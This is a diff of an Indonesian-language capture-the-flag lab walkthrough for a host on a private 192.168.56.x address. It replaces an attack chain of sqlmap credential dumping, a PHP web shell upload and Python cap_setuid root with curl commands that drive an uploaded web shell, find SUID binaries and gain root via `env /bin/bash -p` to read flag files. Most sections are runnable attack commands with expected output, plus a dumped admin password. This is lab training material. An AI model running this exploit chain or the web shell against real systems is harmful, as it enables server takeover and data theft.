+→ akses /uploads/cakgup1.php?cmd=id
+→ RCE sebagai www-data
+→ find SUID
+→ temukan /usr/local/bin/env
+→ jalankan env /bin/bash -p
+→ euid=0(root)
+→ cari /root/FLAG.txt dan /FLAG.txt
+→ baca kedua flag
 ```
 
 ---
 
-## 28. Close Book — Langkah Singkat
+## 29. Close Book — Langkah Singkat
 
-### 28.1 Set Target
+### 29.1 Set Target Web Shell
 
 ```bash
-TARGET="192.168.56.118"
-WEB="http://192.168.56.118:8080"
-LOGIN_URL="$WEB/administrator"
-POST_DATA='username=admin&password=test'
+TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"
 ```
 
-### 28.2 Enumerasi dan Dump Credential
+### 29.2 Validasi RCE
 
 ```bash
-sqlmap -u "$LOGIN_URL" \
-  --data="$POST_DATA" \
-  -p username \
-  --batch \
-  --current-db
-
-sqlmap -u "$LOGIN_URL" \
-  --data="$POST_DATA" \
-  -p username \
-  --batch \
-  -D portrait \
-  --tables
-
-sqlmap -u "$LOGIN_URL" \
-  --data="$POST_DATA" \
-  -p username \
-  --batch \
-  -D portrait \
-  -T users \
-  --dump
+curl "$TARGET?cmd=id"
 ```
 
 Expected:
 
 ```text
-admin
-AdminPortr417126
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### 28.3 Buat Web Shell
+### 29.3 Identifikasi Sistem
 
 ```bash
-cat > cakgup.php <<'EOF'
-<?php system($_GET['cmd']); ?>
-EOF
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=id; whoami; hostname; uname -a; cat /etc/os-release"
 ```
 
-Login ke `/administrator`, buka `/profile`, kemudian upload `cakgup.php`.
-
-### 28.4 Validasi RCE
+### 29.4 Cari Binary SUID
 
 ```bash
-SHELL_URL="$WEB/uploads/cakgup.php"
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
+```
 
-curl -sG \
-  --data-urlencode "cmd=id; whoami; hostname" \
-  "$SHELL_URL"
+Temuan penting:
+
+```text
+/usr/local/bin/env
+```
+
+### 29.5 Validasi Permission
+
+```bash
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=ls -l /usr/local/bin/env"
 ```
 
 Expected:
 
 ```text
-uid=33(www-data)
-www-data
+-rwsr-xr-x 1 root root ... /usr/local/bin/env
 ```
 
-### 28.5 Cari Capability
+### 29.6 Eskalasi Menjadi Root
 
 ```bash
-curl -sG \
-  --data-urlencode "cmd=getcap -r / 2>/dev/null | grep -i python" \
-  "$SHELL_URL"
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
 ```
 
 Expected:
 
 ```text
-/usr/bin/python3.13 cap_setuid=ep
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+root
+EUID=0
 ```
 
-### 28.6 Root dan Cari Flag
+### 29.7 Cari dan Baca Flag
 
 ```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; id; find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
-  "$SHELL_URL"
-```
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"
 
-### 28.7 Baca Flag
-
-```bash
-curl -sG \
-  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
-  "$SHELL_URL"
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt; cat /FLAG.txt'"
 ```
 
 ---
 
-## 29. Cheat Sheet Paling Pendek
+## 30. Cheat Sheet Paling Pendek
 
 ```bash
-WEB="http://192.168.56.118:8080"
-LOGIN_URL="$WEB/administrator"
-POST_DATA='username=admin&password=test'
+TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"
 
-# Credential
-sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch \
-  -D portrait -T users --dump
+# RCE sebagai www-data
+curl "$TARGET?cmd=id"
 
-# Web shell
-cat > cakgup.php <<'EOF'
-<?php system($_GET['cmd']); ?>
-EOF
-# Login admin:AdminPortr417126 → /profile → upload cakgup.php
+# Informasi sistem
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=id;whoami;hostname;uname -a;cat /etc/os-release"
 
-# RCE
-SHELL_URL="$WEB/uploads/cakgup.php"
-curl -sG --data-urlencode "cmd=id;whoami;hostname" "$SHELL_URL"
+# Cari SUID
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
 
-# Cari capability
-curl -sG --data-urlencode \
-  "cmd=getcap -r / 2>/dev/null | grep -i python" \
-  "$SHELL_URL"
+# Cek binary rentan
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=ls -l /usr/local/bin/env"
 
-# Root + cari flag
-curl -sG --data-urlencode \
-  "cmd=/usr/bin/python3.13 -c 'import os;os.setuid(0);os.system(\"whoami;id;find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
-  "$SHELL_URL"
+# Root
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id;whoami;echo EUID=\$EUID'"
 
-# Baca flag
-curl -sG --data-urlencode \
-  "cmd=/usr/bin/python3.13 -c 'import os;os.setuid(0);os.system(\"cat /PATH/FLAG\")'" \
-  "$SHELL_URL"
+# Cari dan baca flag
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"
+
+curl -sG "$TARGET" \
+  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt;cat /FLAG.txt'"
 ```
 
 ---
 
-## 30. Ringkasan Satu Paragraf
+## 31. Ringkasan Satu Paragraf
 
-Target pada port `8080` memiliki SQL Injection pada parameter `username` di login administrator. Kerentanan tersebut digunakan untuk mengidentifikasi database `portrait`, menemukan tabel `users`, dan memperoleh credential `admin:AdminPortr417126`. Setelah login, fitur profile menerima file PHP yang kemudian dapat diakses melalui direktori `/uploads`, sehingga penyerang memperoleh remote command execution sebagai `www-data`. Enumerasi lokal menemukan `/usr/bin/python3.13` memiliki capability `cap_setuid=ep`. Dengan menjalankan `os.setuid(0)`, proses Python memperoleh UID root, sehingga penyerang dapat mengakses seluruh sistem dan membaca flag yang berada di area terproteksi.
+Setelah memperoleh credential administrator melalui SQL Injection, penguji masuk ke aplikasi dan mengunggah file PHP `cakgup1.php` melalui fitur profile. File tersebut dapat diakses melalui `/uploads` dan menjalankan command sistem sebagai `www-data`, sehingga unrestricted file upload terkonfirmasi menjadi remote code execution. Enumerasi lokal menggunakan pencarian binary SUID menemukan `/usr/local/bin/env` dengan permission `-rwsr-xr-x` dan kepemilikan `root`. Binary tersebut digunakan untuk menjalankan `/bin/bash -p`, yang mempertahankan effective UID root. Evidence `id` menunjukkan `uid=33(www-data)` dan `euid=0(root)`, sedangkan `whoami` menghasilkan `root`. Dengan privilege tersebut, penguji dapat mengakses direktori `/root`, menemukan `/root/FLAG.txt` dan `/FLAG.txt`, serta membaca kedua flag sebagai bukti kompromi penuh server.
 
 ---
 
-## 31. Formula Hafalan
+## 32. Formula Hafalan
 
 ```text
-R.S.U.C.R
+R.S.U.S.R
 
 R = Recon
 S = SQL Injection
 U = Upload PHP
-C = Capability Python
+S = SUID env
 R = Root
 ```
-
